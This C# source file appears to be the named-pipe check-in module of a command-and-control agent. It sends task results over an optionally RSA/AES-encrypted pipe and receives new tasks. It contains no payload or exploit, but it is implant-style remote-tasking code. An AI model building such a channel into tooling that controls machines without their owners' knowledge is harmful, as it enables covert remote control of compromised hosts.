using Agent.Communication;
using Agent.Service;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using Agent.Helpers;
using System.Text;

namespace Agent.Models
{
    public class PipeCommModule : CommModule
    {
        public PipeCommModule(ConnexionUrl conn, IMessageService messManager, IFileService fileService, IProxyService proxyService) : base(conn, messManager, fileService, proxyService)
        {
        }


        protected override async Task<List<MessageTask>> CheckIn(List<MessageResult> results)
        {
            var client = new NamedPipeClientStream(Connexion.Address, Connexion.PipeName, PipeAccessRights.FullControl, PipeOptions.Asynchronous, System.Security.Principal.TokenImpersonationLevel.Anonymous, HandleInheritability.None);
            client.Connect(10000);

            // Send a message to the server
            if (this.Connexion.IsSecure)
            {
                var writer = new StreamWriter(client);

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                rsa.KeySize = 2048; // Set the key size to 2048 bits
                rsa.ExportParameters(true); // Export the private key

                //send public Key
                client.SendMessage(Encoding.UTF8.GetBytes(rsa.ToXmlString(false)));

                //receive SymetricKey & IV
                var receivedKeyIV = client.ReceivedMessage(true);
                //Debug.WriteLine("TCPS Comm : EncryptedKey & IV (" + receivedKeyIV.Length + ") = " + string.Join(",", receivedKeyIV.Select(a => ((int)a).ToString())));

                byte[] decryptedKey = rsa.Decrypt(receivedKeyIV.Take(128).ToArray(), false);
                byte[] decryptedIv = rsa.Decrypt(receivedKeyIV.Skip(128).Take(128).ToArray(), false);

                RijndaelManaged rijndael = new RijndaelManaged();
                rijndael.KeySize = 256;
                rijndael.BlockSize = 128;
                rijndael.Key = decryptedKey;
                rijndael.IV = decryptedIv;
                rijndael.Padding = PaddingMode.PKCS7;

                var message = results.Serialize();
                var encryptedMessageBytes = rijndael.CreateEncryptor().TransformFinalBlock(message, 0, message.Length);
                Debug.WriteLine("Pipe Comm : Encrypted Message (write " + encryptedMessageBytes.Length + ")");
                client.SendMessage(encryptedMessageBytes);

                var encryptedResponse = client.ReceivedMessage(true);
                byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(encryptedResponse, 0, encryptedResponse.Length);
                var tasks =  decryptedBytes.Deserialize<List<MessageTask>>();

                writer.WriteLine(); //Ack to end of transfert
                writer.Flush();

                return tasks;
            }
            else
            {
                client.SendMessage(results.Serialize());

                var responseContent = client.ReceivedMessage(true);
                var tasks = responseContent.Deserialize<List<MessageTask>>();

                var writer = new StreamWriter(client);
                writer.WriteLine(); //Ack to end of transfert
                writer.Flush();

                return tasks;
            }
        }

        


    }
}
